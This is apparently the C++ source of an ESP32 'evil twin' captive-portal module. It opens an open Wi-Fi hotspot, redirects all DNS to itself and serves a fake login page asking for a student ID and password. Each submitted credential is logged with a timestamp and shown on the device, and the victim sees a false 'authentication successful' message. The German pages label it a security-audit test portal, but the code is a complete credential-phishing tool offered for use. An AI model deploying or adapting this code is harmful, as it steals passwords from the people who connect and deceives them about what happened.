// --- PortalServer.cpp ---
#include "PortalServer.h"
#include "Globals.h"
#include "Display.h"
#include "HardwareConfig.h"
#include "WebManager.h"
#include "Logic.h"
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <FFat.h>
#include <time.h>

void initPortalFiles() {
    if (!littleFsReady) return;
    if (!FFat.exists("/portal")) FFat.mkdir("/portal");
    if (!FFat.exists("/portal/index.html")) {
        fs::File f = FFat.open("/portal/index.html", "w");
        if (f) {
            f.print(portalHTML.length() > 50 ? portalHTML : defaultEvilHTML);
            f.close();
            Serial.println("[PORTAL] /portal/index.html initialisiert");
        }
    }
}

void handlePortalRoot() {
    if (littleFsReady && FFat.exists("/portal/index.html")) {
        fs::File f = FFat.open("/portal/index.html", "r");
        if (f) {
            server.streamFile(f, "text/html");
            f.close();
            return;
        }
    }
    server.send(200, "text/html", portalHTML.length() > 50 ? portalHTML : defaultEvilHTML);
}

void handlePortalTOS() {
    if (littleFsReady && FFat.exists("/portal/tos.html")) {
        fs::File f = FFat.open("/portal/tos.html", "r");
        if (f) {
            server.streamFile(f, "text/html");
            f.close();
            return;
        }
    }
    String html = F(R"rawliteral(
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Nutzungsbedingungen</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f4f9; color: #333; padding: 20px; line-height: 1.6; }
        .content { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2 { color: #0056b3; border-bottom: 2px solid #0056b3; padding-bottom: 10px; }
        h3 { color: #555; font-size: 16px; margin-top: 20px; }
        .btn-back { display: inline-block; margin-top: 20px; padding: 10px 20px; background-color: #0056b3; color: white; text-decoration: none; border-radius: 4px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="content">
        <h2>Nutzungsbedingungen für das Hotspot-WLAN</h2>
        <h3>1. Geltungsbereich</h3>
        <p>Diese Nutzungsbedingungen regeln die Inanspruchnahme des drahtlosen lokalen Netzwerks (WLAN) zu Demonstrations- und Testzwecken.</p>
        <h3>2. Zulässige Nutzung</h3>
        <p>Das Netzwerk dient der Verifikation von Authentifizierungsabläufen und Sicherheitsüberprüfungen.</p>
        <h3>3. Datensicherheit</h3>
        <p>Verbindungsdaten werden zu Testzwecken temporär im RAM des Testgeräts erfasst.</p>
        <a href="/" class="btn-back">&larr; Zurück zum Login</a>
    </div>
</body>
</html>
)rawliteral");
    server.send(200, "text/html", html);
}

void handlePortalImprint() {
    if (littleFsReady && FFat.exists("/portal/imprint.html")) {
        fs::File f = FFat.open("/portal/imprint.html", "r");
        if (f) {
            server.streamFile(f, "text/html");
            f.close();
            return;
        }
    }
    String html = F(R"rawliteral(
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Impressum</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f4f9; color: #333; padding: 20px; line-height: 1.6; }
        .content { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2 { color: #0056b3; border-bottom: 2px solid #0056b3; padding-bottom: 10px; }
        p { margin-bottom: 15px; }
        .btn-back { display: inline-block; margin-top: 20px; padding: 10px 20px; background-color: #0056b3; color: white; text-decoration: none; border-radius: 4px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="content">
        <h2>Impressum & Testumgebung</h2>
        <p><strong>WatchOS Security Audit Test-Portal</strong></p>
        <p>Lokale Demonstrations- und Sicherheitsumgebung auf ESP32.</p>
        <a href="/" class="btn-back">&larr; Zurück zum Login</a>
    </div>
</body>
</html>
)rawliteral");
    server.send(200, "text/html", html);
}

void handlePortalSubmit() {
    String rawID = server.hasArg("schueler_id") ? server.arg("schueler_id") : (server.hasArg("user") ? server.arg("user") : "Unbekannt");
    String rawPW = server.hasArg("passwort") ? server.arg("passwort") : (server.hasArg("pass") ? server.arg("pass") : "Keins");
    String userID = htmlEscape(rawID);
    String password = htmlEscape(rawPW);

    time_t jetzt; time(&jetzt); struct tm *aktuell = localtime(&jetzt);
    char tBuf[20]; snprintf(tBuf, sizeof(tBuf), "%02d:%02d", aktuell->tm_hour, aktuell->tm_min);
    portalLog += "[" + String(tBuf) + "] User: <b>" + userID + "</b> -> Pass: <span style='color:#ffaa00;'>" + password + "</span><br>";

    triggerVibration(); 
    showToast("Login erfasst: " + rawID.substring(0, 14), 4000); 

    String html = F(R"rawliteral(
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Verbunden</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; background-color: #f4f4f9; padding: 50px 20px; color: #333; }
        .box { background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 400px; margin: 0 auto; border-top: 5px solid #28a745; }
        h2 { color: #28a745; margin-top: 0; }
        p { color: #666; line-height: 1.5; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Authentifizierung erfolgreich</h2>
        <p>Ihre Zugangsdaten wurden verifiziert.<br><br>Sie sind nun verbunden. Sie können dieses Fenster schließen.</p>
    </div>
</body>
</html>
)rawliteral");
    server.send(200, "text/html", html);
}

void togglePortalServer() {
    if (wlanActive) toggleWLAN();
    
    portalActive = !portalActive;
    if (portalActive) {
        if (ESP.getCpuFreqMHz() != 240) setCpuFrequencyMhz(240);
        WiFi.mode(WIFI_AP);
        WiFi.softAP(portalSSID.c_str());
        dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
        dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
        server.begin(); 
        showToast("Captive Portal AKTIV", 3000);
    } else {
        dnsServer.stop();
        server.stop(); 
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_OFF);
        showToast("Captive Portal BEENDET", 3000);
    }
}

